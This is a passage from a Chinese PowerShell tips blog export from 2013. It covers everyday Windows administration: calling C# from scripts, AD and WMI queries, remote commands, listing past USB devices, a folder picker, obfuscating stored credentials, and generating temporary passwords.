中执行一些命令通常需要更复杂的审批过程。 但是从另一方面来说，编写 PowerShell 脚本需要学习一门新的脚本语言并且需要使用他们所熟悉范围之外的工具。作为一个开发者，我喜欢 C# 和 Visual Studio 的智能提示等强大功能。并且，在过去几年内，我用 C# 开发了许多工具——并且我不希望在移植到 PowerShell 的过程中丢弃这些设计好的轮子。 所以如果能在 PowerShell 中复用现有的 C# 代码，而不需要将它以 Cmdlet的形式实现的话，那就十分理想了。 实际上 PowerShell 2.0 提供了一种方式来实现它：使用 Add-Type Cmdlet，它能够通过您提供的 C# 源代码在内存中生成一个新的 .NET 程序集，并且可以将该程序集直接用于同一个会话中的 PowerShell 脚本中。 出于演示的目的，我们假设已有以下简单的 C# 代码，作用是获取和设置 SharePoint 中的 Content Deployment 的 RemoteTimeout 值： using Microsoft.SharePoint.Publishing.Administration; using System; namespace StefanG.Tools { public static class CDRemoteTimeout { public static void Get() { ContentDeploymentConfiguration cdconfig = ContentDeploymentConfiguration.GetInstance(); Console.WriteLine(&quot;Remote Timeout: &quot;+cdconfig.RemoteTimeout); } public static void Set(int seconds) { ContentDeploymentConfiguration cdconfig = ContentDeploymentConfiguration.GetInstance(); cdconfig.RemoteTimeout = seconds; cdconfig.Update(); } } } 除了引用 .NET 框架之外，这个工具还引用了两个 SharePoint DLL（Microsoft.SharePoint.dll 和 Microsoft.SharePoint.Publishing.dll），它们用来存取 SharePoint 的对象模型。为了确保 PowerShell 能正确地生成程序集，我们需要为 Add-Type Cmdlet 用 -ReferencedAssemblies 参数提供引用信息。 为了指定源代码的语言（可以使用 CSharp、CSharpVersion3、Visual Basic 和 JScript），您需要使用 -Language 参数。缺省值是 CSharp。 在我的系统中我有一个 csharptemplate.ps1[csharptemplate.ps1] 文件，我可以快速地复制和修改成我需要的样子来运行我的 C# 代码： $Assem = ( ...add referenced assemblies here... ) $Source = @&quot; ...add C# source code here... &quot;@ Add-Type -ReferencedAssemblies $Assem -TypeDefinition $Source -Language CSharp 对于上述的 C# 例子，对应的最终 PowerShell 脚本如下： $Assem = ( &quot;Microsoft.SharePoint, Version=14.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&quot; , &quot;Microsoft.SharePoint.Publishing, Version=14.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&quot; ) $Source = @&quot; using Microsoft.SharePoint.Publishing.Administration; using System; namespace StefanG.Tools { public static class CDRemoteTimeout { public static void Get() { ContentDeploymentConfiguration cdconfig = ContentDeploymentConfiguration.GetInstance(); Console.WriteLine(&quot;Remote Timeout: &quot;+cdconfig.RemoteTimeout); } public static void Set(int seconds) { ContentDeploymentConfiguration cdconfig = ContentDeploymentConfiguration.GetInstance(); cdconfig.RemoteTimeout = seconds; cdconfig.Update(); } } } &quot;@ Add-Type -ReferencedAssemblies $Assem -TypeDefinition $Source -Language CSharp [StefanG.Tools.CDRemoteTimeout]::Get() [StefanG.Tools.CDRemoteTimeout]::Set(600) 上述例子的最后几行演示了如何在 PowerShell 中调用 C# 方法。 注：文中涉及到的 csharptemplate.ps1 可以在这里[下载][csharptemplate.ps1]。[csharptemplate.ps1]: /assets/download/csharptemplate.ps1","link":"/2013/11/08/using-csharp-c-code-in-powershell-scripts/"},{"title":"PowerShell 技能连载 - 查找缺少邮箱地址的 Active Directory 用户","text":"LDAP 查询的功能非常强大，可以帮助查找缺少信息的账户。 这段代码将返回所有带邮箱地址的 Active Directory 用户： $searcher = [ADSISearcher]&quot;(&amp;(sAMAccountType=$(0x30000000))(mail=*))&quot; $searcher.FindAll() | ForEach-Object { $_.GetDirectoryEntry() } | Select-Object -Property sAMAccountName, name, mail 如果您想查询相反的内容，请通过“!”号进行相反的查询。以下代码可以返回所有缺少邮箱地址的 Active Directory 用户： $searcher = [ADSISearcher]&quot;(&amp;(sAMAccountType=$(0x30000000))(!(mail=*)))&quot; $searcher.FindAll() | ForEach-Object { $_.GetDirectoryEntry() } | Select-Object -Property sAMAccountName, name, mail","link":"/2013/11/12/finding-active-directory-users-with-missing-mail-address/"},{"title":"用 PowerShell 脚本获取天气实况","text":"只要两行命令，就可以“轻松”地获取实时天气预报： (curl http://61.4.185.48:81/g/ -UseBasicParsing).Content -cmatch 'var id=(\\d+);' | Out-Null irm &quot;http://www.weather.com.cn/data/sk/$($matches[1]).html&quot; | select -exp weatherinfo 使用效果： PS &gt;(curl http://61.4.185.48:81/g/ -UseBasicParsing).Content -cmatch 'var id=(\\d+);' | Out-Null PS &gt;irm &quot;http://www.weather.com.cn/data/sk/$($matches[1]).html&quot; | select -exp weatherinfo city : 福州 cityid : 101230101 temp : 15 WD : 北风 WS : 2级 SD : 79% WSE : 2 time : 10:20 isRadar : 1 Radar : JC_RADAR_AZ9591_JB 您还可以把第二行改为以下形式，获取更猛的数据： irm &quot;http://m.weather.com.cn/data/$($matches[1]).html&quot; | select -exp weatherinfo 或： irm &quot;http://www.weather.com.cn/data/cityinfo/$($matches[1]).html&quot; | select -exp weatherinfo 源代码下载 顺便透露一下，高富帅一般不这么看天气预报哦！","link":"/2013/11/12/get-real-time-weather-report-by-powershell/"},{"title":"PowerShell 技能月刊","text":"编号 发布时间 标题 PDF Vol.01 2013年06月 文件系统任务 下载 Vol.02 2013年07月 数组和哈希表 下载 Vol.03 2013年08月 日期、时间和文化 下载 Vol.04 2013年09月 对象和类型 下载 Vol.05 2013年10月 WMI 下载 Vol.06 2013年11月 正则表达式 下载 Vol.07 2013年12月 函数 下载 Vol.08 2013年12月 静态 .NET 方法 下载 Vol.09 2014年01月 注册表 下载 Vol.10 2014年02月 Internet 相关任务 下载 Vol.11 2014年03月 XML 相关任务 下载 Vol.12 2014年08月 安全相关任务 下载 如果您（和我一样）足够懒，也可以用这样一行 PowerShell 代码来下载： 1..12 | ForEach-Object { Invoke-WebRequest &quot;http://powershell.com/cs/PowerTips_Monthly_Volume_$_.pdf&quot; -OutFile &quot;PowerTips_Monthly_Volume_$_.pdf&quot; }","link":"/2013/11/12/powertips-monthly/"},{"title":"PowerShell 技能连载 - 键盘技巧","text":"在 PowerShell ISE 4.0 控制台窗格中，按住 CTRL 键，然后按 向上 键，可以将光标从命令行中移到结果区域中。","link":"/2013/11/13/keyboard-trick/"},{"title":"快速生成树形结构的纯文本","text":"今天帮朋友整理一些材料，需要为这些材料整理一个目录。之前有研究过一些方案，例如： Print plain text tree from tree data structure (java) How to print binary tree diagram? How do I print out a tree structure? Expanding a tree-like data structure 这些方案有一个共性：麻烦。也就是无法像手头的工具一样拿来就用。于是发掘了一番，发现 tree 这个 dos 时代的命令刚好能满足需要。该命令的帮助如下： 以图形显示驱动器或路径的文件夹结构。 TREE [drive:][path] [/F] [/A] /F 显示每个文件夹中文件的名称。 /A 使用 ASCII 字符，而不使用扩展字符。 我们可以用以下命令将 D:\\work 下的结构输出到 output.txt 文本文件： TREE &quot;D:\\work&quot; /F /A &gt; output.txt 然后用记事本之类的文本编辑器对它进行简单的编辑，就可以达到目的。 还可以拓展一下思路：在撰写文章的时候，常常需要描述一个有层次的结构（可以是心得体会之类的，不仅限于描述一系列文件）。此时可以在硬盘里创建一个临时目录，在里面创建一些文件夹和文件，用资源管理器拖拽调整目录结构，然后用上述命令导出一个目录文件，就可以快速地用于文档的撰写了。请不要徒手编辑这样的文本，因为那样很愚蠢，调整起来也相当费功夫。 命令执行效果参考： 卷 os 的文件夹 PATH 列表 卷序列号为 0000002C 000E:BD6F C:. | HaxLogs.log | setmockup.log | WEVTUTIL.exe | +---adt-bundle-windows-x86 | | SDK Manager.exe | | | +---android-ndk-r9 | | | documentation.html | | | GNUmakefile ... | | | README.TXT | | | RELEASE.TXT | | | | | +---build | | | +---awk | | | | check-awk.awk | | | | extract-debuggable.awk","link":"/2013/11/14/generate-plain-text-tree-structure/"},{"title":"PowerShell 技能连载 - 按 F1 跳转到 PowerShell 帮助主题","text":"要在 PowerShell 3.0 ISE 编辑器中获得 PowerShell 所有类型的操作符帮助信息，首先列出关于操作符的所有帮助主题： help operators 您将会见到一个类似这样的列表： PS&gt; help operators Name Category Module Synopsis ---- -------- ------ -------- about_Arithmetic_Operators HelpFile SHORT DESCRIPTION about_Assignment_Operators HelpFile SHORT DESCRIPTION about_Comparison_Operators HelpFile SHORT DESCRIPTION about_Logical_Operators HelpFile SHORT DESCRIPTION about_Operators HelpFile SHORT DESCRIPTION about_Type_Operators HelpFile SHORT DESCRIPTION 如果您没有看见这个列表，您也许需要先下载 PowerShell 帮助文档。请通过 Update-Help 来查看方法！ 然后，单击其中的任意一个主题，然后按下 F1 键。帮助窗口将会打开，并显示详细的帮助。","link":"/2013/11/14/press-f1-to-navigate-powershell-help-topics/"},{"title":"PowerShell 技能连载 - 监测日志文件","text":"从 PowerShell 3.0 开始，实时监测基于文本的日志文件变得很容易。试试以下代码： $Path = &quot;$home\\Desktop\\testfile.txt&quot; 'Test' | Out-File &quot;$home\\Desktop\\testfile.txt&quot; notepad $Path Get-Content -Path $Path -Tail 0 -Wait | Out-GridView -Title $Path 这段代码将在桌面上创建一个文本文件，然后在记事本中打开它。然后 PowerShell 将开始监视文件的变化。一旦您向记事本窗口键入新的文本并保存，则变化的部分会呈现在 PowerShell 的网格视图中。 要监视另一个基于文本的日志文件，只需要改变路径参数即可。由于 PowerShell 在监视文件的状态下处于阻塞状态，您可能需要在另一个 PowerShell 实例中执行新的代码。 译者注：Get-Content -Tail 的效果和 Linux 下的 tail -f 命令的执行效果一致。但 PowerShell 是面向 .NET 对象的，可以利用管道和其它命令，例如 Out-GridView 配合，更为强大。","link":"/2013/11/15/monitoring-log-files/"},{"title":"PowerShell 技能连载 - 以不同用户运行 PowerShell","text":"当您将 PowerShell 固定到任务栏后，您可以右键单击固定的 PowerShell 图标来打开一个跳转列表并且使用完整的 Administrator 特权来打开 PowerShell 或 ISE 编辑器。 您还可以按住 SHIFT 键并且右键单击跳转列表中的 PowerShell 图标。这将打开另一个快捷菜单，您可以在这里选择一个完全不同的凭据来运行 PowerShell。 并没有针对 ISE 编辑器的这个选项，但是当您以不同的凭据运行了 PowerShell 之后，您可以简单地键入命令“ise”来以相同的账户运行 ISE 编辑器。","link":"/2013/11/18/launching-powershell-as-different-user/"},{"title":"PowerShell 技能连载 - 安装 Windows Server 2012 桌面体验","text":"如果您希望将 Windows Server 2012 （或 Windows Server 2008 R2）作为工作站机器使用并且使它看起来像 Windows 8（包括在文件浏览器中刻录 ISO 文件，以及个性化您的桌面和其它设置），您所需要做的只是添加桌面体验功能。以下是用 PowerShell 实现的方法： Add-WindowsFeature -Name Desktop-Experience 在 PowerShell 2.0 中，您首先需要手动导入合适的 module： Import-Module ServerManager","link":"/2013/11/20/installing-server-2012-desktop-experience/"},{"title":"PowerShell 技能连载 - 自动加载 Module","text":"从 PowerShell 3.0 开始，PowerShell 具备了能够智能识别哪些 Cmdlet 是由哪个扩展 Module 导出的特性。所以您再也不需要知道 Module 的名称并且（用 Import-Module 手动导入它）。与之相反，自动完成和智能感知特性将为所有安装在标准 Module 文件夹中的每一个命令提供建议。以下是列出这些标准文件夹的方法： PS&gt; $env:PSModulePath -split ';' C:\\Users\\Victor\\Documents\\WindowsPowerShell\\Modules C:\\Program Files\\WindowsPowerShell\\Modules C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\ 这些标准文件夹也许不一定相同，您可以根据需要增加更多的文件夹到环境变量中，甚至将 Module 存放在 USB 闪存盘或外置驱动器中。以下命令将把 USB 驱动器的路径增加到您的模块列表中，这样在该文件夹中的所有 Module 也将会被自动加载： PS&gt; $env:PSModulePath += ';g:\\mypersonalmodules'","link":"/2013/11/21/loading-modules-automatically/"},{"title":"PowerShell 技能连载 - 改进版的自动加载 Module","text":"当您按照上一个技巧进行设置以后，PowerShell 3.0 便可以自动加载 Module。然而，对于某些 Module，该技术没有效果。那些 Cmdlet 仍然只能通过 Import-Module 的方式来导入 Module。 导致它们的原因是由于它们构建的方式。PowerShell 无法检测到这些 Module 导出了哪些 Cmdlet。 然而，有一行简单的命令可以让更多的 Module 自动变得可用： PS&gt; Get-Module -ListAvailable -Refresh 该 -Refresh switch 参数告知 PowerShell 完整地遍历所有的 Module 并且生成或刷新内部的命令缓存。","link":"/2013/11/22/improving-module-auto-loading/"},{"title":"PowerShell 技能连载 - 列出“真实”的硬盘","text":"WMI 可以提供一个系统的很多信息，但是有些时候这些信息太多了。当您查询逻辑磁盘时，您得到的往往不止是物理磁盘。 设置额外的过滤器可以解决此问题。以下这行代码通过设置 DriveType=3 来获取物理驱动器： PS&gt; Get-WmiObject -Class Win32_LogicalDisk -Filter 'DriveType=3' DeviceID : C: DriveType : 3 ProviderName : FreeSpace : 4468535296 (...) 由于 Get-WmiObject 有一个 -ComputerName 参数，所以您也可以远程获取该信息。如果您想知道有哪些其他的驱动器类型，只需要去掉过滤条件，或者用搜索引擎搜索 &quot;Win32_LogicalDisk DriveType&quot;。","link":"/2013/11/25/listing-quot-real-quot-hard-drives/"},{"title":"修正 SubManager 的一个 bug","text":"目前最好的字幕下载工具是爱页工作室的 SubManager 字幕管理器。程序通过射手网开放的API自批量动下载电影对应的字幕，省去逐个找字幕的麻烦。其工作原理与射手播放器一致，但有十余项增强。 目前它的最新版是 v2013.7.2，我在使用过程中发现一个问题： 当搜索目录中含有扩展名为空的文件时，程序出现异常： 有关调用实时(JIT)调试而不是此对话框的详细信息， 请参见此消息的结尾。 ************** 异常文本 ************** System.ArgumentException: 字符串的长度不能为零。 参数名: oldValue 在 System.String.Replace(String oldValue, String newValue) 在 ShooterDownloader.DownloadForm.PopulateFileList(String dir, String[] fileList) 在 ShooterDownloader.DownloadForm.PopulateFileList(String dir) 在 ShooterDownloader.DownloadForm.PopulateFileList(String dir, String[] fileList) 在 ShooterDownloader.DownloadForm.PopulateFileList(String dir) 在 ShooterDownloader.DownloadForm.PopulateFileList(String dir, String[] fileList) 在 ShooterDownloader.DownloadForm.PopulateFileList(String dir) 在 ShooterDownloader.DownloadForm.PopulateFileList(String dir, String[] fileList) 在 ShooterDownloader.DownloadForm.PopulateFileList(String dir) 在 ShooterDownloader.DownloadForm.PopulateFileList(String dir, String[] fileList) 在 ShooterDownloader.DownloadForm.PopulateFileList(String dir) 在 ShooterDownloader.DownloadForm.PopulateFileList(String dir, String[] fileList) 在 ShooterDownloader.DownloadForm.PopulateFileList(String dir) 在 ShooterDownloader.DownloadForm.txtDir_KeyUp(Object sender, KeyEventArgs e) 在 System.Windows.Forms.Control.OnKeyUp(KeyEventArgs e) 在 System.Windows.Forms.Control.ProcessKeyEventArgs(Message&amp; m) 在 System.Windows.Forms.Control.ProcessKeyMessage(Message&amp; m) 在 System.Windows.Forms.Control.WmKeyChar(Message&amp; m) 在 System.Windows.Forms.Control.WndProc(Message&amp; m) 在 System.Windows.Forms.TextBoxBase.WndProc(Message&amp; m) 在 System.Windows.Forms.TextBox.WndProc(Message&amp; m) 在 System.Windows.Forms.Control.ControlNativeWindow.OnMessage(Message&amp; m) 在 System.Windows.Forms.Control.ControlNativeWindow.WndProc(Message&amp; m) 在 System.Windows.Forms.NativeWindow.Callback(IntPtr hWnd, Int32 msg, IntPtr wparam, IntPtr lparam) 用 Reflector 将 SubManager.exe 反编译，得到它的源代码，定位到 DownloadForm 的 PopulateFileList(String, String[]) : Void 方法。其中只有一行用到 String.Replace() 方法： if ((File.Exists(info.FullName.Replace(info.Extension, &quot;.srt&quot;)) || File.Exists(info.FullName.Replace(info.Extension, &quot;.ass&quot;))) || (File.Exists(info.FullName.Replace(info.Extension, &quot;.ssa&quot;)) || File.Exists(info.FullName.Replace(info.Extension, &quot;.smi&quot;)))) 把它改为： if (string.IsNullOrEmpty(info.Extension) || (File.Exists(info.FullName.Replace(info.Extension, &quot;.srt&quot;)) || File.Exists(info.FullName.Replace(info.Extension, &quot;.ass&quot;))) || (File.Exists(info.FullName.Replace(info.Extension, &quot;.ssa&quot;)) || File.Exists(info.FullName.Replace(info.Extension, &quot;.smi&quot;)))) 并重新编译，该错误提示消失了。 我联系了作者 ayeah，他表示将在下一个版本修复。","link":"/2013/11/26/fix-a-bug-of-submanager/"},{"title":"PowerShell 技能连载 - 获取 WMI 智能感知信息","text":"Get-WmiObject 并未对 WMI 类提供智能感知信息，所以您要么事先知道 WMI 类的名字，要么使用 -List 参数来搜索它。 不过有一个聪明的技巧：Get-CimInstance 命令几乎完成相同的事情，并且它的参数 -ClassName 也接受一个 WMI 类名。而这个参数提供了智能感知支持。 在 PowerShell 3.0 ISE 中进行以下操作： PS&gt; Get-CimInstance -ClassName Win32_ 然后按下 CTRL+SPACE 键来调用智能感知。请观察状态栏提示。由于有几百个 WMI 类名，所以首次尝试的时候，智能感知在获取所有类信息的时候可能会超时。过一段时间，或者您稍微限定以下类名，它就可以正常工作了。 所以只要用 Get-CimInstance 来代替 Get-WmiObject，然后在智能感知的支持下选择类名，然后将 Cmdlet 和参数改回 Get-WmiObject -Class 即可。 或者，从头到尾都使用 Get-CimInstance。它返回基本相同价值的信息。但在缺省情况下，它使用 WSMan 协议来进行远程操作，而不是 DCOM。","link":"/2013/11/26/getting-wmi-intellisense/"},{"title":"PowerShell 技能连载 - 访问终极 PowerShell 生存指南","text":"您熟悉 PowerShell 生存指南吗？它是终极的 PowerShell 维基页面，包括视频、Module，和您很可能需要的关于 PowerShell 的一切资源。最棒的部分：它是一个开放式维基，所以如果您自己创建了一个 PowerShell 资源，希望让其他人知道它，那么您完全可以编辑 PowerShell 生存指南来让别人知道它。 http://social.technet.microsoft.com/wiki/contents/articles/183.windows-powershell-survival-guide.aspx","link":"/2013/11/27/visit-the-ultimate-powershell-survival-guide/"},{"title":"PowerShell 技能连载 - 加速多个 WMI 查询","text":"当您远程执行 Get-WmiObject 命令时，它将会创建一个新的连接。所以如果您查询不同的 WMI 类时，每个查询会使用一个不同的连接，这样将会影响总体性能。 从 PowerShell 3.0 开始，有一些列新的 Cmdlet。使用这些 Cmdlet 可以容易地使用现有的连接高效地运行多个查询： $session = New-CimSession –ComputerName localhost $os = Get-CimInstance –ClassName Win32_OperatingSystem –CimSession $session $bios = Get-CimInstance -ClassName Win32_BIOS -CimSession $session 会话缺省使用 WSMAN 协议： PS&gt; $session Id : 1 Name : CimSession1 InstanceId : 0bb38128-3633-4eb8-8b55-6d2910b89bcd ComputerName : localhost Protocol : WSMAN 当您创建会话是，您可以显式地指定一个不同的远程传输协议，例如 DCOM。","link":"/2013/11/28/speeding-up-multiple-wmi-queries/"},{"title":"PowerShell 技能连载 - 在 ISE 中快速选中结果","text":"如果您想快速地选中并复制 PowerShell 3.0 ISE 编辑器中控制台窗格的结果到您的博客或您喜欢的文字处理器中，例如将结果保存为文档或者贴到文章中。以下是实现的方法： 当您运行一个命令后，光标位于 ISE 控制台窗格中并且等待输入新的命令。只需要按住 CTRL 并按下 左 键。光标将向左移动一位。然后按下 CTRL+A 选取所有的结果，然后按下 CTRL+C 将它们复制到剪贴板。完成！","link":"/2013/11/29/quickly-selecting-results-in-ise/"},{"title":"PowerShell 技能连载 - 访问所有用户的桌面","text":"Resolve-Path 是一个相当棒的查找相同深度路径用的 Cmdlet。例如，以下是一段很短小的代码，它在您机器的每个用户桌面上创建一个文本文件： $root = Split-Path $env:USERPROFILE Resolve-Path $root\\*\\Desktop | ForEach-Object { $Path = Join-Path -Path $_ -ChildPath 'hello there.txt' 'Here is some content...' | Out-File -FilePath $Path Write-Warning &quot;Creating $Path&quot; } 以管理员权限运行您的脚本，它将在您机器中所有用户的桌面上创建一个文件： WARNING: Creating C:\\Users\\Administrator\\Desktop\\hello there.txt WARNING: Creating C:\\Users\\CustomerService\\Desktop\\hello there.txt WARNING: Creating C:\\Users\\Guest\\Desktop\\hello there.txt WARNING: Creating C:\\Users\\PSTestGer\\Desktop\\hello there.txt WARNING: Creating C:\\Users\\Tester\\Desktop\\hello there.txt WARNING: Creating C:\\Users\\Tobias\\Desktop\\hello there.txt","link":"/2013/12/02/accessing-all-users-desktop/"},{"title":"PowerShell 技能连载 - 远程执行代码","text":"在一个域环境中，PowerShell 远程操作功能几乎是开箱即用的。您所需要做的知识在目标机器上启用远程功能（从 Server 2012 开始，PowerShell 远程操作功能对于 Administrators 组用户缺省是启用的）。 在 PowerShell 3.0 中，需要人为地启用远程功能，这就是一切要做的事了（需要管理员权限）： PS&gt; Enable-PSRemoting -SkipNetworkProfileCheck -Force 你不需要在客户端（准备发送命令的机器）上配置任何东西。 下一步，任何管理员可以将命令发送到启用了远程操作功能的机器上去执行它。以下例子将列出目标机器上所有和 PowerShell 相关的进程： $code = { Get-Process -Name powershell*, wsmprovhost -ErrorAction SilentlyContinue } $list = 'server1', 'w2k12-niki', 'pc11box' Invoke-Command -ScriptBlock $code #-ComputerName $list 当您原样执行这段代码的时候，Invoke-Command 在您自己的机器上运行存储在 $code 中的代码块。 它列出所有运行中的 PowerShell 控制台的实例、ISE PowerShell 编辑器，以及所有由您机器上别人初始化的 PowerShell 隐藏远程会话。 而当您去掉 -ComputerName 参数的注释，代码将会在 $list 变量存储的所有计算机上执行。请确保它们存在并且已启用了远程操作功能。当您从远程计算机收到数据时，PowerShell 自动在返回的信息上附加一个 &quot;PSComputerName&quot; 属性，用来存储返回信息的计算机名。","link":"/2013/12/03/executing-code-remotely/"},{"title":"PowerShell 技能连载 - 获取 DLL 文件版本信息","text":"是否需要获取一个 DLL 文件列表以及它们的版本信息？Get-ChildItem 可以为您获取这些信息。您只需要解开其中的一些属性，例如： Get-ChildItem c:\\windows\\system32\\*.dll | Select-Object -ExpandProperty VersionInfo | Select-Object -Property FileName, Productversion, ProductName 以上实际上将原始的 FileInfo 对象替换（-ExpandProperty）成了 VersionInfo 对象。您所做的大概是将一个对象转换成另一个对象，并且丢掉前者的一部分信息。例如，您无法再存取某些属性，如 LastWriteTime 等。 如果您希望保持原有的 FileInfo 对象，但是为它加入某些额外的信息，那么请像这样使用 Add-Member： Get-ChildItem c:\\windows\\system32\\*.dll | Add-Member -MemberType ScriptProperty -Name Version -Value { $this.VersionInfo.ProductVersion } -PassThru | Select-Object -Property LastWriteTime, Length, Name, Version | Out-GridView “$this”是您需要扩展的对象。","link":"/2013/12/04/getting-dll-file-version-info/"},{"title":"PowerShell 技能连载 - 查找已知的 USB 驱动器","text":"您知道吗？Windows 维护着一个关于所有插入过您机器中的 USB 存储设备列表。要导出这个列表十分简单： $Path = 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\*\\*' Get-ItemProperty -Path $Path | Select-Object -Property FriendlyName, CompatibleIDs, Mfg 结果看起来如下： FriendlyName CompatibleIDs Mfg ------------ ------------- --- SCANNER USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... Android UMS Composite USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... Android UMS Composite USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... Generic Flash Disk USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... Hitachi HTS545050B9A300 USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... Landi A015 USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... Landi A015 USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... Landi A015 USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... Linux File-CD Gadget USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... Linux File-CD Gadget USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... Linux File-CD Gadget USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... Linux File-CD Gadget USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... Multiple Card Reader USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... SAMSUNG GT-I9000 USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... SAMSUNG GT-I9000 Card USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... SAMSUNG GT-I9000 Card USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... Ut165 USB Flash Disk USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... WD Elements 1042 USB Device {USBSTOR\\Disk, USBSTOR\\RAW, GenDisk} @disk.inf,%genmanufacturer%;(Standard d... 列表越长，说明您的计算机插入过越多种不同的 USB 存储设备。","link":"/2013/12/05/finding-known-usb-drives/"},{"title":"PowerShell 技能连载 - 通过前缀对文件夹分组","text":"您知道吗？Group-Object 可以方便地以自定义的规则来对元素分组。以下通过简单的一行代码实现根据前三个字母对文件夹分组： Get-ChildItem -Path C:\\Windows -Directory | Group-Object -Property { $_.Name.PadRight(3).Substring(0,3)} 稍微做一些额外的改动，您可以以这三个首字母做为键，创建一个哈希表： $lookup = Get-ChildItem -Path $env:windir -Directory | Group-Object -Property { $_.Name.PadRight(3).Substring(0,3).ToUpper()} -AsHashTable -AsString $lookup.Keys 现在我们可以很容易地取得其中的文件夹，比如说我们要取以“SYS”开头的文件夹： PS C:\\Windows\\System32&gt; $lookup.SYS 目录: C:\\Windows Mode LastWriteTime Length Name ---- ------------- ------ ---- d---- 2013/9/24 21:50 System d-r-- 2013/12/8 13:40 System32 d---- 2013/8/22 23:36 SystemResources d---- 2013/12/5 11:29 SysWOW64 这有什么实用价值呢？有些公司使用文件夹前缀作为业务单元。用上这个技术之后，我们可以很容易地把所有的业务单元文件夹“收拢”起来——您可以秒杀地计算它们的存储容量并且创建一个自动化的报表。","link":"/2013/12/06/getting-folders-by-prefix/"},{"title":"PowerShell 技能连载 - 创建一个文件夹选择器","text":"问了让您的脚本增加一些魅力，以下几行代码可以显示一个文件夹选择对话框。当用户选择了一个文件夹，您的脚本可以接收到选择的结果并且可以获得选择的路径： Add-Type -AssemblyName System.Windows.Forms [System.Windows.Forms.Application]::EnableVisualStyles() $FolderBrowser = New-Object System.Windows.Forms.FolderBrowserDialog $null = $FolderBrowser.ShowDialog() $Path = $FolderBrowser.SelectedPath &quot;You selected: $Path&quot; 请注意前两行：当您在 ISE 编辑器中运行代码时不需要它们，但当您从 powershell.exe 中运行代码时需要它们。所以我们保留着两行来确保您的代码在各个 PowerShell 宿主中都能有效运行。","link":"/2013/12/09/create-a-folder-selector/"},{"title":"PowerShell 技能连载 - 混淆凭据","text":"您有没有办法安全地将机密的密码包含在 PowerShell 脚本中？您肯定不敢。但您可以使得别人更难以获取到秘密的信息。 以下是一个设计成在 PowerShell ISE 编辑器中使用的代码生成器脚本： # ask for credentials $cred = Get-Credential $pwd = $cred.Password $user = $cred.UserName # create random encryption key $key = 1..32 | ForEach-Object { Get-Random -Maximum 256 } # encrypt password with key $pwdencrypted = $pwd | ConvertFrom-SecureString -Key $key # turn key and password into text representations $secret = -join ($key | ForEach-Object { '{0:x2}' -f $_ }) $secret += $pwdencrypted # create code $code = '$i = ''{0}'';' -f $secret $code += '$cred = New-Object PSCredential(''' $code += $user + ''', (ConvertTo-SecureString $i.SubString(64)' $code += ' -k ($i.SubString(0,64) -split &quot;(?&lt;=\\G[0-9a-f]{2})(?=.)&quot; |' $code += ' % { [Convert]::ToByte($_,16) })))' # write new script $editor = $psise.CurrentPowerShellTab.files.Add().Editor $editor.InsertText($code) $editor.SetCaretPosition(1,1) 当您运行它的时候，它将询问用户输入一个用户名和密码。然后，它将会生成一段加密的 PowerShell 脚本片段。您可以在您的脚本中使用它。 以下是由以上脚本生成的一段加密的脚本片段： $i = '73cc7284f9e79f68e9d245b5b2d96c4026397d96cfac6023325d1375414e5f7476492d1116743f0423413b16050a5345MgB8AGgAdABLAEkARABiAFIARgBiAGwAZwBHAHMAaQBLAFoAeQB2AGQAOQAyAGcAPQA9AHwAMgBiADIAMABmADYANwA1ADYANwBiAGYAYwA3AGMAOQA0ADIAMQA3ADcAYwAwADUANAA4ADkAZgBhADYAZgBkADkANgA4ADMAZAA5ADUANABjADgAMgAwADQANQA1ADkAZAA3AGUAMwBmADMAMQAzADQAZgBmADIAZABlADgAZQA=';$cred = New-Object PSCredential('contoso\\fabrikam', (ConvertTo-SecureString $i.SubString(64) -k ($i.SubString(0,64) -split &quot;(?&lt;=\\G[0-9a-f]{2})(?=.)&quot; | % { [Convert]::ToByte($_,16) }))) 这段自动生成的加密脚本片段将会定义一个 $cred 变量，用于保存包括密码在内的合法凭据。接下来您可以将 $cred 变量传递给您脚本中任何需要用户和密码的 -Credential 参数。","link":"/2013/12/10/obfuscating-credentials/"},{"title":"PowerShell 技能连载 - 创建临时密码","text":"以下是一些为您创建不同长度随机密码的代码: $length = 8 $characters = [Char[]]((31..50) + (65..90) + (97..122)) $characters = $characters -ne 'O' -ne 'o' -ne 'l' -ne '1' -ne '-' $password = -join ($characters | Get-Random -Count $length) &quot;Your temporary $length-character-password is $password&quot; 您的密码长度通过 $length 变量设置。用于构成密码的字符集存放在 $characters 变量中。缺省情况下使用 ASCII 编码为 31-50、65-90、97-122 的所有字符。如您所见，通过 -ne 